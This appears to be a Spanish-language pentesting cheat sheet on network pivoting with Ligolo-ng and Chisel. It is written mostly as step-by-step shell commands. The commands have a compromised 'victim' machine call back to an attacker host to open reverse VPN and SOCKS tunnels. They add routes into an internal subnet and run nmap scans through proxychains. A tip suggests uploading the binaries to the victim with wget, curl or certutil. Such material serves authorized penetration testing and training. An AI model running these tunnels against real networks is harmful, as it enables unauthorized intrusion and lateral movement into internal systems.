---
title: Herramientas de Pivoting Avanzado (Ligolo-ng & Chisel)
pubDate: 2026-05-22
---

## ¿Por qué usar herramientas de terceros?
Aunque SSH es excelente, a veces no está disponible o las restricciones de red son muy altas. Estas herramientas permiten crear túneles potentes y transparentes.

| Herramienta | Capa (OSI) | Estilo | Ventaja |
| :--- | :--- | :--- | :--- |
| **Ligolo-ng** | Capa 2/3 | VPN Real | **Transparente:** No requiere Proxychains. El `ping` y `nmap -sS` funcionan. |
| **Chisel** | Capa 4 | HTTP Tunnel | **Evasivo:** Salta firewalls que inspeccionan tráfico web. Requiere Proxychains. |

---

## ⚡ 1. Ligolo-ng (El túnel transparente)
Transforma tu máquina atacante en una "máquina dentro de la red interna".

**Paso 1: Configurar interfaz en tu Kali**
```bash
sudo ip link add pwn0 type tun
sudo ip link set pwn0 up
./proxy -selfcert
```

**Paso 2: Conectar desde la víctima**
```bash
./agent -connect <TU_IP>:11601 -ignore-cert
```

**Paso 3: Activar el túnel (Interfaz Ligolo)**
```bash
# Dentro de la consola de Ligolo:
session
# [Elegir sesión activa]
start
```

**Paso 4: Añadir ruta en tu Kernel (Kali)**
```bash
# Ahora tu Kali sabe que para ir a la red interna debe usar la interfaz pwn0
sudo ip route add 10.10.20.0/24 dev pwn0
```

---

## 🛠️ 2. Chisel (Túneles sobre HTTP)
Perfecto para cuando los puertos inusuales están bloqueados.

**Paso 1: Servidor (En tu Kali)**
```bash
# El servidor escucha en el puerto 8080 (simula tráfico web)
./chisel server -p 8080 --reverse
```

**Paso 2: Cliente (En la víctima)**
```bash
# Crea un túnel SOCKS5 reverso que aparecerá en tu Kali (puerto 1080)
./chisel client <TU_IP>:8080 R:socks
```

**Paso 3: Uso**
Añade `socks5 127.0.0.1 1080` a tu `/etc/proxychains4.conf`.
```bash
proxychains nmap -sT -Pn 10.10.20.5
```

---

## 💡 ¿Cuándo usar cada una?
*   **Usa Ligolo-ng** si puedes ejecutar un binario en la víctima y quieres una experiencia fluida como si estuvieras allí.
*   **Usa Chisel** si el tráfico a puertos extraños (como el 11601 de Ligolo) está bloqueado por un firewall inteligente.

> **Tip:** Recuerda que tanto Ligolo como Chisel son binarios. Deberás subirlos a la máquina víctima (`wget`, `curl` o `certutil`).
